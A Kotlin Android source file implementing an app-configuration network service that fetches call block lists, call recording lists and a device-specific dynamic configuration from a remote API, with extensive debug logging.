package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.CallBlockListResponse
import com.hawkshaw.library.datalayer.models.CallRecordListResponse
import com.hawkshaw.library.datalayer.models.DynamicConfigResponse
import com.hawkshaw.library.datalayer.models.Empty
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import android.util.Log // Added for logging

/**
 * Implementation of AppConfigService
 */
class AppConfigServiceImpl : AppConfigService {
    private companion object { // Companion object for TAG
        private const val TAG = "AppConfigServiceImpl"
    }

    init {
        Log.d(TAG, "[DEBUG] AppConfigServiceImpl instance created.")
    }

    /**
     * Get the list of blocked calls
     */
    override suspend fun getCallBlockList(): ApiResponse<CallBlockListResponse> {
        Log.d(TAG, "[DEBUG] getCallBlockList called.")
        val endpoint = "config.AppConfig/GetCallBlockList"
        val request = Empty()
        Log.d(TAG, "[DEBUG] getCallBlockList: Calling apiCall with endpoint: \"$endpoint\", request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<Empty, CallBlockListResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] getCallBlockList: apiCall returned. Response: $response")
        return response
    }
    
    /**
     * Get the list of call recordings
     */
    override suspend fun getCallRecordList(): ApiResponse<CallRecordListResponse> {
        Log.d(TAG, "[DEBUG] getCallRecordList called.")
        val endpoint = "config.AppConfig/GetCallRecordList"
        val request = Empty()
        Log.d(TAG, "[DEBUG] getCallRecordList: Calling apiCall with endpoint: \"$endpoint\", request: $request")
        // Explicitly specify type arguments for S and T
        val response = apiCall<Empty, CallRecordListResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] getCallRecordList: apiCall returned. Response: $response")
        return response
    }
    
    /**
     * Get the dynamic configuration for the application
     * @param deviceId The ID of the device to get configuration for
     * @return ApiResponse containing the dynamic configuration
     */
    override suspend fun getDynamicConfig(deviceId: String?): ApiResponse<DynamicConfigResponse> {
        Log.d(TAG, "[DEBUG] getDynamicConfig called. Device ID: $deviceId")
        val endpoint = "config.AppConfig/GetDynamicConfig"
        
        // Create a request map to include device ID if provided
        val request = mutableMapOf<String, Any>()
        deviceId?.let { request["device_id"] = it }
        
        Log.d(TAG, "[DEBUG] getDynamicConfig: Calling apiCall with endpoint: \"$endpoint\", request: $request")
        
        // Use the map for the request
        val response = try {
            apiCall<Map<String, Any>, DynamicConfigResponse>(
                endpoint = endpoint,
                req = request.ifEmpty { emptyMap() } as Map<String, Any>
            )
        } catch (e: Exception) {
            Log.e(TAG, "[ERROR] getDynamicConfig: Error fetching dynamic config", e)
            return ApiResponse.Error("Failed to fetch dynamic configuration: ${e.message}")
        }
        
        Log.d(TAG, "[DEBUG] getDynamicConfig: apiCall returned. Response: $response")
        return response
    }
}
